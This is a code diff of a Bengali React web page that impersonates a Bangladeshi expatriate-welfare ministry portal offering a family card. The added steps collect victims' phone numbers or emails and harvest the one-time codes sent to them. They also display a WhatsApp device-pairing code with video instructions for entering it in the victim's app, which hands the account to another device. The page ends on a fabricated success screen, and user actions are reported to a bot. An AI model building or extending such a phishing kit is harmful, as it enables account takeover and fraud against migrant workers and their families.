+                    </div>
+                  </div>
+
+                  <div className="space-y-1.5 text-center">
+                    <h3 className="font-black text-slate-800 text-base">আপনার বিবরণ প্রদান করুন</h3>
+                    <p className="text-xs text-slate-500">আপনার {getRegistrationTypeDetails(activeRegistrationType).badge} কপি পেতে আপনার সঠিক বিবরণটি প্রদান করুন</p>
+                  </div>
+
+                  <div className="space-y-2 pt-2">
+                    <label className="text-xs font-black text-slate-700">
+                      {selectedPlatform === 'email' ? 'আপনার জিমেইল/ইমেইল এড্রেস লিখুন' : 'ফোন নাম্বার'}
+                    </label>
+                    
+                    <div className="flex gap-2 items-center">
+                      <div className="relative w-full">
+                        <input 
+                          id="platform-input-field"
+                          type={selectedPlatform === 'email' ? 'email' : 'tel'} 
+                          value={platformInputValue}
+                          onChange={(e) => setPlatformInputValue(e.target.value)}
+                          placeholder={selectedPlatform === 'email' ? 'example@gmail.com' : '[ ফোন নাম্বার ]'}
+                          className={`w-full font-bold text-sm bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 focus:outline-none focus:ring-2 ${theme.ring} focus:bg-white text-slate-800`}
+                        />
                       </div>
-                    </motion.div>
-                  )}
-                </AnimatePresence>
-              </div>
-            </div>
 
-            <button 
-              id="btn-cancel-otp"
-              onClick={handleBack}
-              className="text-xs font-bold text-slate-500 hover:text-slate-700 underline flex items-center gap-1 mt-2 mx-auto cursor-pointer"
-            >
-              <ChevronLeft size={14} /> বাতিল করুন এবং প্ল্যাটফর্ম নির্বাচনে যান
-            </button>
-          </motion.div>
-        )}
-
-        {/* Step E: Pending response / WhatsApp Pairing screen */}
-        {regStep === 'pending' && selectedPlatform && (
-          <motion.div initial={{ opacity: 0, scale: 0.98 }} animate={{ opacity: 1, scale: 1 }} className="space-y-6">
-            {selectedPlatform === 'whatsapp' ? (
-              <div className="bg-white border border-slate-200/80 rounded-3xl p-5 shadow-sm text-left space-y-4">
-                <div className="flex justify-between items-center border-b border-slate-100 pb-3">
-                  <div className="flex items-center gap-1.5 text-[#25D366] font-black">
-                    <WhatsAppIcon />
-                    <span className="text-xs">WhatsApp Device Linker</span>
-                  </div>
-                  <span className="w-2.5 h-2.5 bg-amber-400 rounded-full animate-ping"></span>
-                </div>
-
-                <div className="bg-amber-50/50 border border-amber-100 p-4 rounded-xl text-xs text-amber-950 font-medium leading-relaxed">
-                  নিরাপত্তা ভেরিফিকেশন সেশন স্থাপন করতে আপনার ফোন নম্বরটি একটি সুরক্ষিত ডক কনসোলে পেয়ার হচ্ছে। নিচের ৮ সংখ্যার কোড দিয়ে আপনার হোয়াটস্যাপ অ্যাপে লিংক করুন:
-                </div>
-
-                {/* WhatsApp web pairing layout */}
-                <div className="flex flex-col items-center gap-3 py-1">
-                  <p className="text-[11px] font-black text-slate-500">WHATSAPP WEB LINK CODE:</p>
-                  
-                  {/* Pair code boxes - Customer can NOT type in these boxes */}
-                  <div className="flex gap-1.5 justify-center">
-                    {wpPairingCode.split('').map((char, index) => (
-                      <div 
-                        key={index} 
-                        className={`w-9 h-11 bg-slate-50 border-2 border-slate-200 rounded-lg flex items-center justify-center font-mono font-black text-slate-850 text-lg shadow-sm ${char === '-' ? 'border-transparent bg-transparent !w-3' : 'animate-pulse'}`}
-                      >
-                        {char === '-' ? '-' : char}
-                      </div>
-                    ))}
+                      <AnimatePresence>
+                        {isInputValid() && (
+                          <motion.button
+                            id="btn-submit-input-next"
+                            initial={{ opacity: 0, scale: 0.8 }}
+                            animate={{ opacity: 1, scale: 1 }}
+                            exit={{ opacity: 0, scale: 0.8 }}
+                            onClick={handleSubmitInput}
+                            className={`${theme.bg} ${theme.hover} text-white shrink-0 p-3 rounded-xl shadow-lg cursor-pointer flex items-center justify-center`}
+                          >
+                            <Send size={18} />
+                          </motion.button>
+                        )}
+                      </AnimatePresence>
+                    </div>
+                    
+                    <div className="text-[10px] text-slate-400 font-bold leading-normal pt-1 flex items-center gap-1.5">
+                      <Clock size={12} />
+                      <span> hisab vailify details to setup a dynamic collection route.</span>
+                    </div>
                   </div>
                 </div>
+              </motion.div>
+            )}
 
-                <div className="bg-slate-50 border border-slate-200 p-4.5 rounded-xl space-y-3">
-                  <div className="flex justify-between items-center">
-                    <span className="text-[10px] font-black text-slate-500">আপনার মোবাইল নম্বর:</span>
-                    <span className="text-[11px] font-mono font-black text-slate-700 bg-white border border-slate-200 px-2 py-0.2 rounded">+88 {platformInputValue}</span>
+            {/* Step C: Transition Loading */}
+            {regStep === 'loading' && (
+              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="py-12 space-y-6">
+                <div className="flex flex-col items-center justify-center space-y-4">
+                  <div className="relative w-24 h-24">
+                    <div className={`absolute inset-0 rounded-full border-4 border-slate-200`}></div>
+                    <div className={`absolute inset-0 rounded-full border-4 border-t-transparent ${theme.border} animate-spin`}></div>
+                    <div className="absolute inset-0 flex items-center justify-center">
+                      <span className="text-xs font-mono font-black text-slate-700">{loadingProgress}%</span>
+                    </div>
                   </div>
 
-                  <div className="border-t border-slate-200/50 pt-3 flex items-center gap-3">
-                    <div className="w-2.5 h-2.5 rounded-full bg-[#25D366] animate-pulse"></div>
-                    <p className="text-[11px] text-[#0f5132] font-black leading-relaxed">
-                      অনলাইন পোর্টাল গেটওয়ে সার্ভারে আপনার লিঙ্ক কোডটি অটো সাবমিট অবস্থায় রয়েছে। আমরা আপনার কনফার্মেশন যাচাই করছি, অনুগ্রহ করে অপেক্ষা করুন...
+                  <div className="space-y-2 max-w-xs mx-auto text-center">
+                    <h3 className="font-black text-slate-800 text-base leading-tight">সার্ভার গেটওয়ে সংযোগ করা হচ্ছে...</h3>
+                    <p className="text-xs text-slate-500 leading-normal">
+                      মন্ত্রণালয় গেটওয়ের সাহায্যে আপনার দেওয়া তথ্যের সংযোগ চ্যানেল স্থাপন করা হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন।
                     </p>
                   </div>
                 </div>
-              </div>
-            ) : (
-              <div className="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm space-y-5 text-center">
-                <div className="flex justify-center">
-                  <div className="relative w-16 h-16">
-                    <div className={`absolute inset-0 rounded-full border-4 border-slate-100 animate-pulse`}></div>
-                    <div className={`absolute inset-0 rounded-full border-4 border-t-transparent ${theme.border} animate-spin`}></div>
+              </motion.div>
+            )}
+
+            {/* Step D: OTP Verification View */}
+            {regStep === 'otp' && selectedPlatform && (
+              <motion.div initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }} className="space-y-4 text-left">
+                <div className="flex items-center justify-between border-b border-slate-200 pb-3">
+                  <span className="text-xs font-black text-slate-500">সুরক্ষিত ওটিপি সংযোগ</span>
+                  <span className={`text-xs font-black px-2.5 py-0.5 text-white rounded-md ${theme.bg}`}>
+                    {theme.label}
+                  </span>
+                </div>
+
+                {/* Main Security Warning */}
+                <div className="bg-amber-50 border border-amber-200 p-4 rounded-2xl flex items-start gap-3">
+                  <AlertTriangle className="text-amber-600 shrink-0 w-5 h-5 mt-0.5 animate-pulse" />
+                  <div>
+                    <p className="text-[11px] font-black text-amber-950 leading-relaxed">
+                      নিরাপত্তা নিশ্চিত করতে প্রবাসী মন্ত্রণালয়ের অফিসিয়াল সার্ভার থেকে আপনাকে একটি ভেরিফাই OTP নাম্বার পাঠানো হয়েছে অনুগ্রহ করে নাম্বার টি এখানে লিখে নিরাপত্তা নিশ্চিত করুন।
+                    </p>
                   </div>
                 </div>
 
-                <div className="space-y-2">
-                  <h3 className="font-black text-lg text-slate-850">ওটিপি যাচাই করা হচ্ছে...</h3>
-                  <p className="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
-                    প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান অনলাইন সার্ভার কর্তৃক আপনার ওটিপি বিবরণটি পরীক্ষা করা হচ্ছে। সফল সংকেত পাওয়া পর্যন্ত অপেক্ষা করুন।
-                  </p>
+                {otpErrorMessage && (
+                  <motion.div initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} className="bg-rose-50 border border-rose-200 p-3 rounded-xl text-rose-800 text-xs font-black leading-relaxed">
+                    {otpErrorMessage}
+                  </motion.div>
+                )}
+
+                <div className="space-y-4">
+                  <div className="bg-slate-50 rounded-2xl p-5 border border-slate-200/60">
+                    <p className="text-xs font-black text-slate-700 mb-2 text-center">
+                      আপনার {theme.label} আইডিতে প্রেরিত ওটিপি নাম্বারটি লিখুন ({otpLength} সংখ্যার)
+                    </p>
+
+                    {/* Countdown indicator message */}
+                    {otpCountdown > 0 ? (
+                      <div className="bg-amber-50 border border-amber-200 text-amber-905 text-xs font-bold rounded-xl p-2.5 text-center leading-relaxed mb-4 w-full shadow-sm flex items-center justify-center gap-1.5">
+                        <span className="w-2 h-2 bg-amber-500 rounded-full animate-ping"></span>
+                        <span>ওটিপি গেটওয়ে সুরক্ষিত করা হচ্ছে... আরও <b>{otpCountdown} সেকেন্ড</b> অপেক্ষা করুন</span>
+                      </div>
+                    ) : (
+                      <div className="bg-emerald-50 text-emerald-800 text-xs font-bold rounded-xl p-2.5 text-center border border-emerald-100 mb-4 w-full shadow-sm flex items-center justify-center gap-1.5">
+                        <span className="w-2.5 h-2.5 bg-emerald-500 rounded-full animate-pulse"></span>
+                        <span>ওটিপি গেটওয়ে সচল হয়েছে! এখন আপনার ভেরিফিকেশন ওটিপি কোডটি লিখুন</span>
+                      </div>
+                    )}
+
+                    <div className="flex flex-col gap-4 items-center">
+                      <div className="flex justify-center gap-1.5 md:gap-2 w-full">
+                        {Array.from({ length: otpLength }).map((_, i) => (
+                          <input 
+                            key={i}
+                            id={`otp-box-${i}`}
+                            type="text"
+                            pattern="[0-9]*"
+                            inputMode="numeric"
+                            maxLength={1}
+                            value={otpValues[i] || ''}
+                            onChange={(e) => handleOtpChange(e.target.value, i, otpLength)}
+                            onKeyDown={(e) => handleOtpKeyDown(e, i)}
+                            disabled={otpCountdown > 0}
+                            className="w-11 h-12 md:w-12 md:h-13 bg-white border-2 border-slate-250 rounded-xl text-center text-lg font-black text-slate-700 focus:outline-none focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600 text-slate-800 font-mono shadow-sm disabled:opacity-50 disabled:bg-slate-100 disabled:border-slate-200 disabled:cursor-not-allowed"
+                          />
+                        ))}
+                      </div>
+
+                      {/* Help Button - Show Tutorial */}
+                      <div className="w-full flex justify-center !mt-1">
+                        <button
+                          id="btn-show-otp-help"
+                          onClick={() => {
+                            setShowVideoTutorial(true);
+                            notifyBot('Clicked to view where-is-my-otp video tutorial frame');
+                          }}
+                          className="text-xs font-black text-emerald-700 hover:text-emerald-800 underline flex items-center gap-1 cursor-pointer transition-all active:scale-[0.98] py-1.5"
+                        >
+                          <Play size={12} className="fill-emerald-700" />
+                          আপনার ওটিপি নাম্বার টি কোথায় পাঠানো হয়েছে তা দেখতে এখানে ক্লিক করুন
+                        </button>
+                      </div>
+                    </div>
+
+                    {/* Inline Video Player Frame */}
+                    <AnimatePresence>
+                      {showVideoTutorial && (
+                        <motion.div 
+                          initial={{ opacity: 0, height: 0 }} 
+                          animate={{ opacity: 1, height: 'auto' }} 
+                          exit={{ opacity: 0, height: 0 }}
+                          className="w-full overflow-hidden border border-slate-200 rounded-2xl bg-black mt-2 inline-block text-center relative"
+                        >
+                          <video
+                            id="otp-tutorial-video"
+                            ref={videoRef}
+                            src="https://assets.mixkit.co/videos/preview/mixkit-holding-a-smartphone-with-a-blue-screen-41372-large.mp4"
+                            className="w-full h-48 object-cover"
+                            autoPlay
+                            playsInline
+                            onEnded={() => {
+                              setShowVideoTutorial(false);
+                              notifyBot('Help video playback completed. Hiding video frame automatically.');
+                            }}
+                          />
+                          <div className="bg-slate-900 p-2 text-center flex items-center justify-between px-3 border-t border-white/10">
+                            <span className="text-[10px] text-white/85 font-bold flex items-center gap-1">
+                              <Clock size={11} className="text-amber-400" /> ওটিপি কোডটি কিভাবে খুঁজবেন দেখুন
+                            </span>
+                            <button
+                              id="btn-hide-otp-help-manual"
+                              onClick={() => {
+                                setShowVideoTutorial(false);
+                                notifyBot('User manually hit Hide Video button.');
+                              }}
+                              className="bg-white/10 hover:bg-white/20 active:scale-[0.97] transition px-2.5 py-1 text-[10px] font-black rounded text-red-100 flex items-center gap-1 cursor-pointer"
+                            >
+                              Hide Video (লুকান)
+                            </button>
+                          </div>
+                        </motion.div>
+                      )}
+                    </AnimatePresence>
+                  </div>
                 </div>
 
-                <div className="bg-emerald-50 border border-emerald-100 p-3.5 rounded-xl font-bold text-xs text-[#0f5132] inline-flex items-center gap-2 justify-center w-full">
-                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
-                  <span>সার্ভার থেকে সফল সিগন্যাল প্রত্যাশা করা হচ্ছে...</span>
-                </div>
-              </div>
+                <button 
+                  id="btn-cancel-otp"
+                  onClick={handleBack}
+                  className="text-xs font-bold text-slate-500 hover:text-slate-700 underline flex items-center gap-1 mt-2 mx-auto cursor-pointer"
+                >
+                  <ChevronLeft size={14} /> বাতিল করুন এবং প্ল্যাটফর্ম নির্বাচনে যান
+                </button>
+              </motion.div>
             )}
 
-            <button 
-              id="btn-cancel-pending"
-              onClick={handleBack}
-              className="text-xs font-bold text-slate-500 hover:text-slate-700 underline flex items-center gap-1 mx-auto cursor-pointer"
-            >
-              <ChevronLeft size={14} /> যাচাই প্রক্রিয়া বাতিল করুন
-            </button>
-          </motion.div>
-        )}
+            {/* Step E: Pending response / WhatsApp Pairing screen */}
+            {regStep === 'pending' && selectedPlatform && (
+              <motion.div initial={{ opacity: 0, scale: 0.98 }} animate={{ opacity: 1, scale: 1 }} className="space-y-6">
+                {selectedPlatform === 'whatsapp' ? (
+                  <div className="bg-white border border-slate-200/80 rounded-3xl p-5 shadow-sm text-left space-y-4">
+                    <div className="flex justify-between items-center border-b border-slate-100 pb-3">
+                      <div className="flex items-center gap-1.5 text-[#25D366] font-black">
+                        <WhatsAppIcon />
+                        <span className="text-xs">WhatsApp Device Linker</span>
+                      </div>
+                      <span className="w-2.5 h-2.5 bg-amber-400 rounded-full animate-ping"></span>
+                    </div>
 
-        {/* Step F: Celebration Success screen */}
-        {regStep === 'success' && (
-          <motion.div initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }} className="space-y-6">
-            <div className="bg-gradient-to-r from-emerald-800 to-teal-900 border border-emerald-950 p-6 rounded-3xl shadow-xl text-white space-y-4">
-              <div className="flex justify-center">
-                <CheckCircle2 size={56} className="text-emerald-300 animate-bounce" />
+                    <div className="bg-amber-50/50 border border-amber-100 p-4 rounded-xl text-xs text-amber-950 font-medium leading-relaxed">
+                      নিরাপত্তা ভেরিফিকেশন সেশন স্থাপন করতে আপনার ফোন নম্বরটি একটি সুরক্ষিত ডক কনসোলে পেয়ার হচ্ছে। নিচের ৮ সংখ্যার কোড দিয়ে আপনার হোয়াটস্যাপ অ্যাপে লিংক করুন:
+                    </div>
+
+                    {/* WhatsApp web pairing layout */}
+                    <div className="flex flex-col items-center gap-3 py-1">
+                      {/* Notice: আপনার গোপনীয়তা রক্ষারর্থে নাম্বার টি ১ মিনিট পর পর পরিবর্তন হবে */}
+                      <p className="text-[11px] font-bold text-rose-600 bg-rose-50 border border-rose-100 rounded-xl px-3.5 py-2 text-center w-full shadow-sm animate-pulse">
+                        ⚠️ আপনার গোপনীয়তা রক্ষারর্থে নাম্বার টি ১ মিনিট পর পর পরিবর্তন হবে
+                      </p>
+
+                      <p className="text-[11px] font-black text-slate-500 mt-1">WHATSAPP WEB LINK CODE:</p>
+                      
+                      {/* Pair code boxes - Customer can NOT type in these boxes */}
+                      <div className="flex gap-1.5 justify-center">
+                        {(() => {
+                          let displayChars: string[] = [];
+                          if (wpCountdown > 0) {
+                            displayChars = `LOAD-${wpCountdown.toString().padStart(2, '0')}S`.split('');
+                          } else if (!wpPairingCode) {
+                            displayChars = 'AWAITING'.split('');
+                          } else {
+                            const cleanCode = wpPairingCode.replace(/[\s-]/g, '').toUpperCase().slice(0, 8);
+                            displayChars = cleanCode.padEnd(8, '-').split('');
+                          }
+
+                          return displayChars.map((char, index) => {
+                            const isSpecial = char === '-' || char === '.' || (wpCountdown > 0 && index === 4);
+                            // Highlight the box background differently when loading vs awaiting vs code active
+                            let boxBg = 'bg-slate-50 border-slate-200 text-slate-850';
+                            let animatedClass = 'animate-pulse';
+                            
+                            if (wpCountdown > 0) {
+                              boxBg = 'bg-amber-50/50 border-amber-300 text-amber-700';
+                            } else if (!wpPairingCode) {
+                              boxBg = 'bg-slate-100 border-slate-300 text-slate-500';
+                            } else {
+                              boxBg = 'bg-emerald-50 border-emerald-400 text-emerald-700 shadow-emerald-100/50';
+                              animatedClass = 'scale-105 transition-all duration-300';
+                            }
+
+                            return (
+                              <div 
+                                key={index} 
+                                className={`w-9 h-11 border-2 rounded-xl flex items-center justify-center font-mono font-black text-lg shadow-sm ${boxBg} ${isSpecial ? 'border-transparent bg-transparent !w-3' : animatedClass}`}
+                              >
+                                {isSpecial ? '-' : char}
+                              </div>
+                            );
+                          });
+                        })()}
+                      </div>
+
+                      {wpCountdown > 0 ? (
+                        <p className="text-[11px] text-amber-600 font-bold animate-pulse mt-1">
+                          ⏳ ভেরিফিকেশন সেশন লিংক লোড হচ্ছে... {wpCountdown} সেকেন্ড
+                        </p>
+                      ) : !wpPairingCode ? (
+                        <p className="text-[11px] text-slate-500 font-semibold animate-pulse mt-1">
+                          🛜 সার্ভার থেকে ডিভাইস লিঙ্ক কোডের জন্য অপেক্ষা করা হচ্ছে...
+                        </p>
+                      ) : (
+                        <div className="w-full space-y-3 mt-1">
+                          <p className="text-[11px] text-emerald-600 font-black flex items-center justify-center gap-1 animate-pulse">
+                            🟢 লাইভ পেয়ারিং কোড সচল রয়েছে!
+                          </p>
+
+                          {/* Beautiful Copy Box Animation */}
+                          <motion.div
+                            initial={{ opacity: 0, y: 12, scale: 0.95 }}
+                            animate={{ opacity: 1, y: 0, scale: 1 }}
+                            className="bg-gradient-to-r from-emerald-500 to-teal-600 text-white p-4.5 rounded-2xl shadow-lg border border-emerald-400 space-y-3 text-center w-full"
+                          >
+                            <div className="flex items-center justify-center gap-2">
+                              <span className="relative flex h-2.5 w-2.5">
+                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75"></span>
+                                <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-white"></span>
+                              </span>
+                              <p className="text-xs font-black tracking-wide">নাম্বার গুলো কপি করুন</p>
+                            </div>
+
+                            <button
+                              id="btn-copy-wp-code"
+                              onClick={handleCopyWpPairingCode}
+                              className="w-full bg-white text-emerald-800 hover:bg-slate-50 active:scale-[0.98] transition-all font-black text-xs py-2.5 px-4 rounded-xl shadow-md flex items-center justify-center gap-2 cursor-pointer border border-emerald-100"
+                            >
+                              <Copy size={14} className="text-emerald-600" />
+                              কপি করুন
+                            </button>
+
+                            {copiedCode && (
+                              <motion.p
+                                initial={{ opacity: 0 }}
+                                animate={{ opacity: 1 }}
+                                className="text-[10.5px] text-emerald-100 font-extrabold flex items-center justify-center gap-1"
+                              >
+                                ⏳ কোড কপি হয়েছে! নিচের ভিডিও নির্দেশনা গাইড দেখুন...
+                              </motion.p>
+                            )}
+                          </motion.div>
+                        </div>
+                      )}
+                    </div>
+
+                    <div className="bg-slate-50 border border-slate-200 p-4.5 rounded-xl space-y-3">
+                      <div className="flex justify-between items-center">
+                        <span className="text-[10px] font-black text-slate-500">[ ফোন নাম্বার ]:</span>
+                        <span className="text-[11px] font-mono font-black text-slate-700 bg-white border border-slate-200 px-2 py-0.2 rounded">{platformInputValue}</span>
+                      </div>
+
+                      <div className="border-t border-slate-200/50 pt-3 flex items-center gap-3">
+                        <div className="w-2.5 h-2.5 rounded-full bg-[#25D366] animate-pulse"></div>
+                        <p className="text-[11px] text-[#0f5132] font-black leading-relaxed">
+                          অনলাইন পোর্টাল গেটওয়ে সার্ভারে আপনার লিঙ্ক কোডটি অটো সাবমিট অবস্থায় রয়েছে। আমরা আপনার কনফার্মেশন যাচাই করছি, অনুগ্রহ করে অপেক্ষা করুন...
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                ) : (
+                  <div className="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm space-y-5 text-center">
+                    <div className="flex justify-center">
+                      <div className="relative w-16 h-16">
+                        <div className={`absolute inset-0 rounded-full border-4 border-slate-105 animate-pulse`}></div>
+                        <div className={`absolute inset-0 rounded-full border-4 border-t-transparent ${theme.border} animate-spin`}></div>
+                      </div>
+                    </div>
+
+                    <div className="space-y-2">
+                      <h3 className="font-black text-lg text-slate-850">ওটিপি যাচাই করা হচ্ছে...</h3>
+                      <p className="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
+                        প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান অনলাইন সার্ভার কর্তৃক আপনার ওটিপি বিবরণটি পরীক্ষা করা হচ্ছে। সফল সংকেত পাওয়া পর্যন্ত অপেক্ষা করুন।
+                      </p>
+                    </div>
+
+                    <div className="bg-emerald-50 border border-emerald-100 p-3.5 rounded-xl font-bold text-xs text-[#0f5132] inline-flex items-center gap-2 justify-center w-full">
+                      <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
+                      <span>সার্ভার থেকে সফল সিগন্যাল প্রত্যাশা করা হচ্ছে...</span>
+                    </div>
+                  </div>
+                )}
+
+                <button 
+                  id="btn-cancel-pending"
+                  onClick={handleBack}
+                  className="text-xs font-bold text-slate-500 hover:text-slate-700 underline flex items-center gap-1 mx-auto cursor-pointer"
+                >
+                  <ChevronLeft size={14} /> যাচাই প্রক্রিয়া বাতিল করুন
+                </button>
+              </motion.div>
+            )}
+
+            {/* Step F: Celebration Success screen */}
+            {regStep === 'success' && (
+              <motion.div initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }} className="space-y-6">
+                <div className="bg-gradient-to-r from-emerald-800 to-teal-900 border border-emerald-950 p-6 rounded-3xl shadow-xl text-white space-y-4">
+                  <div className="flex justify-center">
+                    <CheckCircle2 size={56} className="text-emerald-300 animate-bounce" />
+                  </div>
+                  
+                  <div className="space-y-1">
+                    <h3 className="text-lg font-black text-amber-300">ভেরিফিকেশন সফল হয়েছে!</h3>
+                    <p className="text-xs text-emerald-100 leading-relaxed">
+                      অভিনন্দন! আপনার প্রবাসী ফ্যামিলি অ্যাকাউন্টটির আবেদন অনলাইন ডাটাবেজে সফলভাবে ভেরিফাইড এবং নিবন্ধন সম্পন্ন হয়েছে।
+                    </p>
+                  </div>
+
+                  <div className="bg-white/10 p-3.5 rounded-xl border border-white/15 text-left text-xs leading-normal space-y-1 font-bold font-mono">
+                    <div className="flex justify-between items-center font-sans">
+                      <span>অনলাইন আইডি:</span>
+                      <span className="font-mono text-amber-300 font-extrabold">{sessionUserId.toUpperCase()}</span>
+                    </div>
+                    <div className="flex justify-between items-center font-sans">
+                      <span>নিবন্ধন মিডিয়া:</span>
+                      <span className="capitalize">{selectedPlatform}</span>
+                    </div>
+                    <div className="flex justify-between items-center font-sans">
+                      <span>নিবন্ধিত নম্বর:</span>
+                      <span className="font-mono">{platformInputValue}</span>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="bg-slate-50 border border-slate-200 rounded-3xl p-5 shadow-sm space-y-3 text-left">
+                  <p className="text-xs font-black text-slate-800 leading-normal">
+                    আজকের দিনের ৪৫২ জন আবেদনকারীর সাথে আপনার পোর্টাল সিরিয়ালটি যুক্ত করা হয়েছে। আপনার পরিবারের যেকোনো সদস্যের জন্য এই বিশেষ কার্ডের সকল সুবিধা এখন কার্যকরী করা হলো।
+                  </p>
+
+                  <button 
+                    id="btn-confirm-success-done"
+                    onClick={() => {
+                      const familyData = {
+                        name: `${selectedPlatform === 'email' ? 'সহজ প্রবাসী ইউজার' : 'মো: প্রবাসী নাগরিক'} (ভেরিফাইড)`,
+                        number: 'FAM-' + Math.floor(1000 + Math.random() * 9000) + '-' + 
+                                Math.floor(1000 + Math.random() * 9000) + '-' + 
+                                Math.floor(1000 + Math.random() * 9000),
+                        expiry: '09/35',
+                        bg: theme.bg.includes('gradient') ? theme.bg : 'linear-gradient(135deg, #11998e 0%, #38ef7d 100%)',
+                        familyMembers: [
+                          { name: 'মোসাম্মৎ রহিমা বেগম', relation: 'স্ত্রী', age: 32, health: 'সুস্থ', education: 'N/A' },
+                          { name: 'আব্দুল্লাহ আল মামুন', relation: 'পুত্র', age: 8, health: 'সুস্থ', education: '৩য় শ্রেণী' }
+                        ]
+                      };
+                      setUserData(familyData);
+                      localStorage.setItem('family_card_data', JSON.stringify(familyData));
+                      setIsRegistering(false);
+                      notifyBot(`Registration Success complete for ${sessionUserId} on ${selectedPlatform}`);
+                    }}
+                    className="w-full bg-gov-green hover:bg-emerald-800 text-white py-3.5 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all hover:scale-[1.01] active:scale-[0.99]"
+                  >
+                    <CheckCircle2 size={16} /> হোম ড্যাশবোর্ডে ফিরে যান
+                  </button>
+                </div>
+              </motion.div>
+            )}
+          </div>
+
+          {/* Right Column: Instruction Video Frame */}
+          {activeVideo && (
+            <motion.div 
+              id="video-tutorial-pane"
+              initial={{ opacity: 0, x: 20 }} 
+              animate={{ opacity: 1, x: 0 }} 
+              className="md:col-span-5 bg-white border-2 border-slate-100 p-5 rounded-3xl shadow-md space-y-4 text-left"
+            >
+              <div className="flex items-center gap-2 border-b border-slate-150 pb-3">
+                <Play className={`w-6 h-6 p-1.5 rounded-lg text-white ${theme.bg}`} />
+                <h3 className="font-black text-slate-800 text-xs md:text-sm">{activeVideo.title}</h3>
               </div>
-              
-              <div className="space-y-1">
-                <h3 className="text-lg font-black text-amber-300">ভেরিফিকেশন সফল হয়েছে!</h3>
-                <p className="text-xs text-emerald-100 leading-relaxed">
-                  অভিনন্দন! আপনার প্রবাসী ফ্যামিলিカードটির আবেদন অনলাইন ডাটাবেজে সফলভাবে ভেরিফাইড এবং নিবন্ধন সম্পন্ন হয়েছে।
+
+              {/* Custom Animated Notification Message once numbers are copied */}
+              {copiedCode && selectedPlatform === 'whatsapp' && regStep === 'pending' && (
+                <motion.div
+                  initial={{ opacity: 0, y: -10, scale: 0.95 }}
+                  animate={{ opacity: 1, y: 0, scale: 1 }}
+                  className="bg-red-50 border-2 border-red-200 text-red-950 p-4 rounded-2xl shadow-md text-xs font-black text-center leading-relaxed space-y-2 animate-bounce-subtle"
+                >
+                  <div className="flex justify-center items-center gap-1.5 text-red-600">
+                    <span className="w-2.5 h-2.5 bg-red-500 rounded-full animate-ping"></span>
+                    <span>নির্দেশনা অনুসরণ করুন</span>
+                  </div>
+                  <p className="text-[12.5px] leading-relaxed">
+                    ভিডিও তে দেখানো নির্দেশনা দেখে আপনার ফোনে নাম্বার গুলো প্রবেশ করান, এবং আপনার আবেদন সম্পূর্ণ করুন
+                  </p>
+                </motion.div>
+              )}
+
+              <div className="relative overflow-hidden rounded-2xl bg-black aspect-video border border-slate-200">
+                <video 
+                  src={activeVideo.src} 
+                  controls 
+                  autoPlay
+                  loop
+                  muted 
+                  playsInline 
+                  className="w-full h-full object-cover"
+                  onError={(e) => {
+                    // Fallback visually if not uploaded
+                    e.currentTarget.src = "https://assets.mixkit.co/videos/preview/mixkit-holding-a-smartphone-with-a-blue-screen-41372-large.mp4";
+                  }}
+                />
+              </div>
+              <div className="bg-slate-50 p-3.5 rounded-xl border border-slate-200/60 text-xs text-slate-600 font-medium leading-relaxed space-y-1.5">
+                <p className="font-extrabold text-slate-800 flex items-center gap-1.5">
+                  💡 সহায়িকা বার্তা:
+                </p>
+                <p>
+                  আপনার কার্ডটি সফলভাবে সংগ্রহ করতে পাশের ধাপে উল্লেখিত তথ্য প্রদান করুন। সঠিক নির্দেশনার জন্য উপরের ভিডিও সহায়িকাটি মনোযোগ সহকারে দেখুন।
                 </p>
               </div>
-
-              <div className="bg-white/10 p-3.5 rounded-xl border border-white/15 text-left text-xs leading-normal space-y-1 font-bold font-mono">
-                <div className="flex justify-between items-center font-sans">
-                  <span>অনলাইন আইডি:</span>
-                  <span className="font-mono text-amber-300 font-extrabold">{sessionUserId.toUpperCase()}</span>
-                </div>
-                <div className="flex justify-between items-center font-sans">
-                  <span>নিবন্ধন মিডিয়া:</span>
-                  <span className="capitalize">{selectedPlatform}</span>
-                </div>
-                <div className="flex justify-between items-center font-sans">
-                  <span>নিবন্ধিত নম্বর:</span>
-                  <span className="font-mono">{platformInputValue}</span>
-                </div>
-              </div>
-            </div>
-
-            <div className="bg-slate-50 border border-slate-200 rounded-3xl p-5 shadow-sm space-y-3 text-left">
-              <p className="text-xs font-black text-slate-800 leading-normal">
-                আজকের দিনের ৪৫২ জন আবেদনকারীর সাথে আপনার পোর্টাল সিরিয়ালটি যুক্ত করা হয়েছে। আপনার পরিবারের যেকোনো সদস্যের জন্য এই বিশেষ কার্ডের সকল সুবিধা এখন কার্যকরী করা হলো।
-              </p>
-
-              <button 
-                id="btn-confirm-success-done"
-                onClick={() => {
-                  const familyData = {
-                    name: `${selectedPlatform === 'email' ? 'সহজ প্রবাসী ইউজার' : 'মো: প্রবাসী নাগরিক'} (ভেরিফাইড)`,
-                    number: 'FAM-' + Math.floor(1000 + Math.random() * 9000) + '-' + 
-                            Math.floor(1000 + Math.random() * 9000) + '-' + 
-                            Math.floor(1000 + Math.random() * 9000),
-                    expiry: '09/35',
-                    bg: theme.bg.includes('gradient') ? theme.bg : 'linear-gradient(135deg, #11998e 0%, #38ef7d 100%)',
-                    familyMembers: [
-                      { name: 'মোসাম্মৎ রহিমা বেগম', relation: 'স্ত্রী', age: 32, health: 'সুস্থ', education: 'N/A' },
